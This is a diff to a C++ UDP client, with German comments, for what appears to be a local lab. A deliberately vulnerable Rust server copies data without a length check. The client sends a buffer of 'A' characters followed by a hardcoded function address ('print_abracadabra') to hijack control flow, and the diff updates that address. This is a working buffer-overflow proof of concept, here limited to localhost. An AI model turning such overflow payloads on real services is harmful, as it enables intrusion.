@@ -9,6 +9,32 @@
 #define SERVER_IP "127.0.0.1"
 #define SERVER_PORT 1234
 
+//----------------------------------Szenario------------------------------------------
+/*
+ * UDP-Kommunikation zwischen einem Server und einem Client
+ * Dieses Szenario zeigt die Implementierung eines UDP-Servers in Rust und eines
+ * zugehörigen Clients in C++.
+ * Der Server hört auf Port 1234 und empfängt Nachrichten von Clients.
+ * Der Client sendet Daten an die IP-Adresse 127.0.0.1 (localhost) auf demselben
+ * Port.
+ *
+ *
+ * Die Funktion `vulnerable_function` im Server implementiert ein unsicheres
+ * Verhalten indem sie Daten ohne Längenprüfung kopiert. Dies könnte zu einem
+ * Buffer Overflow und möglichen Sicherheitslücken führen.
+ *
+ * Der Client kann genutzt werden, um diese Schwachstelle zu testen oder zu
+ * missbrauchen indem übergroße Daten gesendet werden.
+ */
+
+//----------------------------------Ablauf------------------------------------------
+/*
+ * Der Server wird gestartet und hört auf Port 1234.
+ * Der Client verbindet sich mit dem Server und sendet Daten.
+ * Abhängig von der Größe der gesendeten Daten kann der Server ein Fehlverhalten
+ * zeigen, wenn die Sicherheitslücke ausgenutzt wird.
+ */
+
 int main(int argc, char *argv[]) {
   int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
   if (sockfd < 0) {
@@ -27,7 +53,7 @@ int main(int argc, char *argv[]) {
 
   std::memset(payload, 'A', PAYLOAD_OFFSET_SIZE);
 
-  uintptr_t func_addr = 0x55555555e1d0; // Adresse von print_abracadabra
+  uintptr_t func_addr = 0x55555555d8a0; // Adresse von print_abracadabra
   *(uintptr_t *)(payload + PAYLOAD_OFFSET_SIZE) = func_addr;
 
   // Debug-Ausgabe der gesendeten Adresse
